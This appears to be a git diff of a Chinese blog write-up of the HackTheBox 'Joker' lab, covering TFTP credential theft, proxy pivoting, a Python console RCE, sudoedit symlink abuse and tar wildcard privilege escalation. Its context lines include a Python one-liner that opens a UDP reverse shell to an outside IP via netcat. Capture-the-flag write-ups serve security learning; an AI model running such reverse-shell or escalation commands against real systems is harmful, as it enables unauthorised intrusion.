@@ -4,12 +4,13 @@ title:  "HackTheBox-Joker"
 date: 2024-03-15
 categories: HackTheBox
 permalink: /:year/:month/:day/:title.html
-tags: TFTP Squid HashCat Sudo WildCards
+tags: TFTP Squid HashCat Sudo WildCards Python
 ---
 
-![Joker](/assets/media/Joker/Joker.png)
+<!-- ![Joker](/assets/media/Joker/Joker.png) -->
 
-在针对目标主机的安全渗透测试中，我们采用了一系列复杂而精细的技术手段，包含但不限于TFTP文件传输、密码哈希解密、Squid代理配置漏洞利用、高效目录扫描、Python远程代码执行（RCE）、Sudo权限提升、交互式Shell环境优化、SSH私钥认证、细致的主机信息搜集以及计划任务下通过tar命令配合通配符实现权限提升的技术等。寻求突破点的关键在于深入的信息搜集工作，特别是针对UDP端口的精确扫描。我们通过TFTP服务成功下载了Squid代理的配置文件，该文件中包含了关键的凭证信息。尽管密码凭证被MD5加密，但借助HashCat工具，我们能够破解出相应的明文密码。获取关键的用户凭证后，我们配置HTTP代理以访问内部服务，并发现本地80端口对外开放，这一发现极大地促进了我们的进展。如果此端口不可访问，则需要通过系统地遍历其他潜在开放端口来寻找可利用点。在对网站进行初步的目录探索后，我们发现了一个敏感的接口/console，它直接导向了一个Python执行环境。测试表明系统不允许通过TCP协议进行外部通信，因此构建了一个UDP反向Shell代码，成功获得了用户级权限。进一步的信息搜集揭示了用户可以无需密码即可通过sudoedit（作为sudo套件的一部分）编辑loyout.html文件。这要求一个交互式的环境，而通过升级交互环境后，我们能够通过创建符号链接将layout.html直接指向SSH私钥文件，利用这一策略成功以用户alekos的身份登录SSH。在深入探索主机目录结构时，我们注意到/development目录下藏有多个tar包，推测这些可能与计划任务中的tar命令打包活动相关。通过使用pspy工具监控，我们确认了这一过程的定时执行特性。最终，我们巧妙地利用tar命令结合通配符技术，成功提升至管理员权限，彻底掌握了目标系统的控制权。
+
+在针对目标主机的攻击中我们采用了一系列的技术手段，包含但不限于TFTP文件传输、密码哈希解密、Squid代理配置漏洞利用、高效目录扫描、Python远程代码执行（RCE）、Sudo权限提升、交互式Shell环境优化、SSH私钥认证、细致的主机信息搜集以及计划任务下通过tar命令配合通配符实现权限提升等。寻求突破点的关键在于深入的信息搜集工作，特别是针对UDP端口的精确扫描。通过TFTP服务成功下载了Squid代理的配置文件，该文件中包含了关键的凭证信息。尽管密码凭证被MD5加密，但借助HashCat工具仍能破解出相应的明文密码。获取关键的用户凭证后，配置HTTP代理以访问内部服务，并发现本地80端口对外开放，这一发现极大地促进了攻击进展。如果此端口不可访问，则需要系统地遍历其他潜在开放端口来寻找可利用点。在对网站进行初步的目录探索后，一个敏感的接口/console直接导向了Python执行环境。测试表明系统不允许通过TCP协议进行外部通信，因此构建了一个UDP反向Shell代码，成功获得了用户级权限。进一步的信息搜集揭示了用户可以无需密码即可通过sudoedit（作为sudo套件的一部分）编辑layout.html文件。这要求一个可输入特殊符号的交互式环境，而升级交互环境后通过创建符号链接将layout.html直接指向authorized_keys，利用这一策略成功以用户alekos的身份登录SSH。在深入探索主机目录结构时，我们注意到/development目录下藏有多个tar包，推测这些可能与计划任务中的tar命令打包活动相关。使用pspy工具监控进程后确认了定时任务执行的特性。最终巧妙地利用tar打包命令结合通配符技术，成功提升至管理员权限。
 
 ## 0x01 侦查
 
@@ -209,7 +210,7 @@ with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
 
 ![截屏2024-03-24 02.17.10](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.17.10.png)
 
- 执行命令通过 UDP 协议出站获取shell
+执行命令通过 UDP 协议出站获取shell
 
 ``` shell
 import os;os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.16.26 443 >/tmp/f &").read()
@@ -233,14 +234,16 @@ sudo -l
 
 ![截屏2024-03-24 02.27.18](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2002.27.18.png)
 
-使用`sudoedit`命令会调用编辑器，而在当前终端环境下无法使用特殊符号来操作编辑器，一般可使用以下命令来改善交互式体验
+使用`sudoedit`命令会调用编辑器，而在当前终端环境下无法使用特殊符号来操作编辑器，可使用以下命令来改善交互式体验
 
 ``` shell
 stty raw -echo;fg
 reset
 ```
 
-![截屏2023-09-28 16.25.10](/assets/media/16957503649402/%E6%88%AA%E5%B1%8F2023-09-28%2016.25.10.png)在`testing`目录下新建`test`目录，完成后通过 ln 命令创建符号链接指向 alekos 家目录下的`authorized_keys`
+![截屏2023-09-28 16.25.10](/assets/media/16957503649402/%E6%88%AA%E5%B1%8F2023-09-28%2016.25.10.png)
+
+在`testing`目录下新建`test`目录，完成后通过 ln 命令创建符号链接指向 alekos 家目录下的`authorized_keys`
 
 ``` shell
 ln -s /home/alekos/.ssh/authorized_keys layout.html
@@ -278,7 +281,7 @@ cat user.txt
 
 ![截屏2024-03-24 03.15.44](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.15.44.png)
 
-而`development`目录下为由 Python 构建的应用代码
+而`/development`目录下为由 Python 构建的应用代码
 
 ![截屏2024-03-24 03.15.21](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.15.21.png)
 
@@ -334,7 +337,9 @@ cat root.txt
 
 查看`backup.sh`显示其中存在`tar`命令和通配符`*`
 
-![截屏2024-03-24 03.26.27](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.26.27.png)想要删除写入的文件可使用以下命令
+![截屏2024-03-24 03.26.27](/assets/media/Joker/%E6%88%AA%E5%B1%8F2024-03-24%2003.26.27.png)
+
+想要删除写入的文件可使用以下命令
 
 ``` shell
 rm -- --checkpoint=1
